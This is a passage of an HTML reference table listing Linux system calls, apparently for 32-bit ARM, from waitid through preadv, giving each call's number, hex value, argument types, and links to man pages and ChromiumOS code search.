href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0x118</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">281</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0x119</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">282</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0x11a</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0x11b</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0x11c</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">285</td><td>accept</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td><td align="center">0x11d</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">286</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0x11e</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">287</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0x11f</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">288</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0x120</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">289</td><td>send</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/send.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*send">cs/</a></td><td align="center">0x121</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0x122</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">291</td><td>recv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recv">cs/</a></td><td align="center">0x123</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>-</td><td>-</td></tr><tr><td align="center">292</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0x124</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">293</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0x125</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">294</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0x126</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">295</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0x127</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">296</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0x128</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">297</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0x129</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">298</td><td>semop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td><td align="center">0x12a</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">299</td><td>semget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td><td align="center">0x12b</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">300</td><td>semctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td><td align="center">0x12c</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td></tr><tr><td align="center">301</td><td>msgsnd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td><td align="center">0x12d</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td>-</td><td>-</td></tr><tr><td align="center">302</td><td>msgrcv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td><td align="center">0x12e</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td></tr><tr><td align="center">303</td><td>msgget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td><td align="center">0x12f</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">304</td><td>msgctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td><td align="center">0x130</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">305</td><td>shmat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td><td align="center">0x131</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">306</td><td>shmdt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td><td align="center">0x132</td><td>char *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">307</td><td>shmget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td><td align="center">0x133</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">308</td><td>shmctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td><td align="center">0x134</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">309</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0x135</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">310</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0x136</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">311</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0x137</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">312</td><td>semtimedop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td><td align="center">0x138</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec *timeout</td><td>-</td><td>-</td></tr><tr><td align="center">313</td><td>vserver</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vserver.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vserver">cs/</a></td><td align="center">0x139</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">314</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0x13a</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">315</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0x13b</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">316</td><td>inotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init">cs/</a></td><td align="center">0x13c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">317</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0x13d</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">318</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0x13e</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">319</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0x13f</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">320</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0x140</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">321</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0x141</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">322</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x142</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">323</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x143</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">324</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x144</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">325</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x145</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">326</td><td>futimesat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futimesat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futimesat">cs/</a></td><td align="center">0x146</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">327</td><td>fstatat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatat64">cs/</a></td><td align="center">0x147</td><td>int dfd</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">328</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x148</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">329</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x149</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">330</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x14a</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">331</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x14b</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">332</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x14c</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">333</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x14d</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">334</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x14e</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">335</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x14f</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">336</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x150</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">337</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x151</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">338</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x152</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">339</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x153</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">340</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x154</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">341</td><td>arm_sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arm_sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arm_sync_file_range">cs/</a></td><td align="center">0x155</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">341</td><td>sync_file_range2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range2">cs/</a></td><td align="center">0x155</td><td>int fd</td><td>unsigned int flags</td><td>loff_t offset</td><td>loff_t nbytes</td><td>-</td><td>-</td></tr><tr><td align="center">342</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x156</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">343</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x157</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">344</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0x158</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">345</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0x159</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">346</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x15a</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">347</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0x15b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">348</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x15c</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">349</td><td>signalfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd">cs/</a></td><td align="center">0x15d</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">350</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x15e</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">351</td><td>eventfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd">cs/</a></td><td align="center">0x15f</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">352</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x160</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">353</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x161</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">354</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x162</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">355</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x163</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">356</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x164</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">357</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x165</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">358</td><td>dup3</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x166</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">359</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x167</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">360</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x168</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">361</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a 